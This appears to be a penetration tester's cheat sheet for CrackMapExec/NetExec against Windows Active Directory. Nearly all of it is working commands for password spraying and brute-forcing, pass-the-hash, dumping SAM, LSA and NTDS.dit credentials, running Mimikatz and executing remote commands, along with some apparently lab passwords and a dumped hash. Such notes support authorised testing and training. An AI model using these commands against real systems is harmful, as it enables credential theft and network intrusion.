# crackmapexec
- <https://github.com/byt3bl33d3r/CrackMapExec>
- <https://ptestmethod.readthedocs.io/en/latest/cme.html>
- <https://cheatsheet.haax.fr/windows-systems/exploitation/exploitation_tricks/>



This package is a swiss army knife for pentesting Windows/Active Directory environments.



CrackMapExec version 5.4.0 may throw the error The NETBIOS connection with the remote host is timed out for DCSRV1, or doesn't provide any output at all. Version 5.4.1 contains a fix to address this issue.


- perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system
- enumerating logged on users
- spidering SMB shares
- execute psexec style attacks
- auto-injecting Mimikatz/Shellcode/DLL's into memory using Powershell
- dump the NTDS.dit
- and more



## `nxc` / `netexec` 
NetExec is the continuation of CrackMapExec, which was maintained by mpgn over the years, but discontinued upon mpgnâ€™s retirement.

- <https://www.kali.org/tools/netexec/>


```
nxc smb [IP] -u aduser.txt -p '[password]' --continue-on-success
nxc smb [IP] -u [usename] -p '[password]'
nxc smb [IP] -u [usename] -p '[password]' --ntds

```


















# Use quotes for -p if your password has a speicial character
# proxychains4 is optional depends whether you are working against an internal network
# put USER as '' and PASS as '' for null session check
# Check pass pol before bruteforcing to avoid lockout
cme smb IP -u USER -p PASS --pass-pol
# cme bruteforce
proxychains4 -q cme smb DOMAIN_NAME -u USERS -p PASS   --continue-on-success
# cme password spray
proxychains4 -q cme smb DOMAIN_NAME -u USERS -p PASS --continue-on-success
# cme creds attempt not brute force
proxychains4 -q cme smb DOMAIN_NAME  -u USERS -p PASS --continue-on-success --no-bruteforce
# check if creds reused and see permissions to shares
for each in $(cat hosts.txt);do cme smb $each -u USER -p PASS --shares;done
# Grep user list, look for sid > 1000, not always work
cme smb DOMAIN -u guest -p '' --rid-brute | grep  SidTypeUser
# Pass the hash
cme smb IP -u USER -H NTLM_HASH
# enumerate shares
cme smb IP --shares -u USER -p PASS 
# Enumerate access
# if smb show pwned, means psexec and smbexec can be used for shell access
cme smb IP -u USER -p PASS 
# if winrm show pwned, means evil-winrm can be used for shell access
cme winrm IP -u USER -p PASS 
# ssh is quite self-explanatory
cme ssh IP -u USER -p PASS
# if mssql show access granted, try sqsh to SQLi to RCE
cme mssql IP -u USER -p PASS 
# try to authenticate as local computer administrator
cme smb IP -u Administrator -p PASS --local-auth














- <https://www.crackmapexec.wiki/>

crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, viceversa can also be done

#Try --local-auth option if nothing comes up
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks
crackmapexec smb <DC-IP> -u 'user' -p 'password' --users #we need to provide DC ip
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions #active logon sessions
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dumps password policy
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam #SAM hashes
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa #dumping lsa secrets
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds #dumps NTDS.dit file
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} #we can also run with a specific group and enumerated users of that group.
crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executing commands, "-x" for cmd and "-X" for powershell command

#Pass the hash
crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
#We can run all the above commands with hash and obtain more information

#crackmapexec modules
crackmapexec smb -L #listing modules
crackmapexec smb -M mimikatx --options #shows the required options for the module
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default command
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M 




- Crackmapexec database

```bash
cmedb #to launch the console
help #run this command to view some others, running individual commands give infor on all the data till now we did.
```




























## PtH
```
crackmapexec smb 10.129.41.19 -u rachel -H [NTLM hash]

crackmapexec smb [IP] -u Administrator -H [DUMPED HASH] -x "ipconfig"
```









## Credential Spraying
```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success


crackmapexec smb [IP]/24 -u "leon" "Administrator" -p "HomeTaping199\!"

```

If the user with the identified credentials has administrative privileges crackmapexec adds `Pwn3d!` to the output. In an assessment, this is 
an excellent feature to determine the level of access we have without performing additional enumeration.









## SMB

```
crackmapexec [IP]
crackmapexec [IP] --shares -u '' -p ''
crackmapexec [IP] --shares -u 'foobar' -p '' # may fall back to anonymous log in


crackmapexec winrm [IP] -u [USERS FILE] -p [PASSWORD FILE]
crackmapexec winrm [IP] -u administrator -p [PASSWORD FILE]

crackmapexec winrm [IP] -u administrator -p tinkerbell -x "whoami"
crackmapexec winrm [IP] -u administrator -p tinkerbell -x "systeminfo"



# Confirm MachineAccountQuota
crackmapexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M MAQ

```



```
crackmapexec smb [TARGET] -u maya -p "m4y4ngs4ri" --sam
...
MB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
...
```




list the SMB shares and their permissions
```
crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares

proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
```




